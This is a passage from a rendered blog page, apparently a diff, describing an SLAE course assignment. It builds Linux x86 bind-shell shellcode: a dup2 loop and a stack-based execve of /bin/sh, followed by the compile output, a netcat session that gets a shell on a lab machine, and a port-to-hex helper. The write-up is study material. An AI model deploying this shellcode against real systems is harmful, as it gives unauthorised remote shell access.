+<span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">;set 2 as the counter for the dup2 loop. The significance of 2 is for STDIN(0), STDOUT(1) and STDERR(2)</span>
+
+<span class="n">redirection_loop</span><span class="o">:</span>
+  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span> <span class="c">;dup2 syscall</span>
+  <span class="k">int</span> <span class="mh">0x80</span> <span class="c">;execute dup2 syscall</span>
+  <span class="k">dec</span> <span class="n">ecx</span> <span class="c">;decrement the loop counter</span>
+  <span class="k">jns</span> <span class="n">redirection_loop</span> <span class="c">;conditional jump to the redirection_loop as long as the signed flag (SF) is not set.</span>
+</code></pre></div> <h3 id="execve">Execve</h3> <p>Considering that all input, output and error message have been redirected to the client, the last section to complete is the execution of a shell.</p> <p>The instructions being used are for a really simple stack-based <code class="highlighter-rouge">execve</code> SYSCALL that executes <code class="highlighter-rouge">/bin/sh</code>.</p> <p>The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here</a><a>.</a></p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>  <span class="c">;zero out eax</span>
+<span class="k">push</span> <span class="n">eax</span>      <span class="c">;push 00000000 on to the stack</span>
+
+
+<span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">;push hex hs/n on to the stack</span>
+<span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">;push hex ib// on to the stack</span>
+
+<span class="c">;at this point the stack contains //bin/sh0x00000000</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;this satisfies the requirements for *filename (first argument of execve)</span>
+
+<span class="k">push</span> <span class="n">eax</span>      <span class="c">;push 00000000 on to the stack</span>
+
+<span class="c">;at this point the stack contains 0x00000000//bin/sh0x00000000</span>
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;we cant pop 0x00000000 into EDX as the shellcode cannot have any null characters.</span>
+              <span class="c">;instead we move the current address pointed to by ESP into EDX.</span>
+              <span class="c">;this address contains the last value pushed on to the stack, which is 0x00000000</span>
+              <span class="c">;this satisfies the requirements for envp (third argument of execve)</span>
+
+<span class="k">push</span> <span class="n">ebx</span>      <span class="c">;ebx contains the memory address of the stack where //bin/sh0x00000000 is.</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;this satisfies the requirements for argv (second argument of execve)</span>
+
+<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>     <span class="c">;execve syscall number, 0xb works also.</span>
+<span class="k">int</span> <span class="mh">0x80</span>       <span class="c">;initiate</span>
+</code></pre></div> <h3 id="testing-execution">Testing Execution</h3> <p>I built on top of <a href="https://twitter.com/SecurityTube">Vivek’s</a> nasm linker and assembler shell script and added the opcode extractor and C compiler used in the SLAE course. You can find <code class="highlighter-rouge">super-compile.sh</code> <a href="https://github.com/skahwah/slae/blob/master/super-compile.sh">here</a>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ls
+bind.nasm  super-compile.sh
+skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ./super-compile.sh bind
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+[+] Creating Shellcode
+[+] Compiling Shellcode
+[+] Done!
+skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ls
+bind  bind.nasm  bind.o  shellcode-bind  shellcode-bind.c  super-compile.sh
+skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ./shellcode-bind
+Shellcode Length: 103
+
+</code></pre></div> <h4 id="connecting">Connecting</h4> <div class="highlighter-rouge"><pre class="highlight"><code>19:04 skawa@skawa-mbp: ~ $ nc -nv 192.168.156.156 3879
+found 0 associations
+found 1 connections:
+     1:	flags=82&lt;CONNECTED,PREFERRED&gt;
+	outif vmnet8
+	src 192.168.156.1 port 50727
+	dst 192.168.156.156 port 3879
+	rank info not available
+	TCP aux info available
+
+Connection to 192.168.156.156 port 3879 [tcp/*] succeeded!
+uname -a
+Linux ubuntu 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed Aug 14 15:31:16 UTC 2013 i686 i686 i386 GNU/Linux
+whoami
+skawa
+^C
+19:05 skawa@skawa-mbp: ~ $
+</code></pre></div> <h4 id="wrapper">Wrapper</h4> <p>For ease of configuration, I have put together a script that takes user supplied network information and converts it to hexadecimal. This can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/networkhex.rb">here</a>. The IP address is irrelevant for this particular case.</p> <div class="language-ruby highlighter-rouge"><pre class="highlight"><code><span class="mi">08</span><span class="p">:</span><span class="mi">25</span> <span class="n">skawa</span><span class="vi">@skawa</span><span class="o">-</span><span class="ss">mbp: </span><span class="no">Desktop</span> <span class="err">$</span> <span class="n">ruby</span> <span class="n">networkhex</span><span class="p">.</span><span class="nf">rb</span>
+<span class="no">IP</span><span class="p">:</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">156</span><span class="o">.</span><span class="mi">156</span> <span class="n">is</span> <span class="p">\</span><span class="n">xc0</span><span class="p">\</span><span class="n">xa8</span><span class="p">\</span><span class="n">x9c</span><span class="p">\</span><span class="n">x9c</span>
+<span class="no">Port</span><span class="p">:</span> <span class="mi">3879</span> <span class="n">is</span> <span class="p">\</span><span class="n">x0f</span><span class="p">\</span><span class="n">x27</span>
+<span class="mi">08</span><span class="p">:</span><span class="mi">25</span> <span class="n">skawa</span><span class="vi">@skawa</span><span class="o">-</span><span class="ss">mbp: </span><span class="no">Desktop</span> <span class="err">$</span>
+</code></pre></div> <p>The converted network port can then be placed into the <code class="highlighter-rouge">PORT</code> variable of the <code class="highlighter-rouge">C</code> shellcode wrapper. This can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/shellcode-bind.c">here</a>.</p> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SLAE" title="Pages tagged SLAE" class="tag"><span class="term">SLAE</span></a><a href="http://localhost:4000/tags/#SecurityTube" title="Pages tagged SecurityTube" class="tag"><span class="term">SecurityTube</span></a><a href="http://localhost:4000/tags/#Assignment" title="Pages tagged Assignment" class="tag"><span class="term">Assignment</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#bind%20shell" title="Pages tagged bind shell" class="tag"><span class="term">bind shell</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/SLAE-Assignment-1/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/SLAE-Assignment-1/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/SLAE-Assignment-1/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
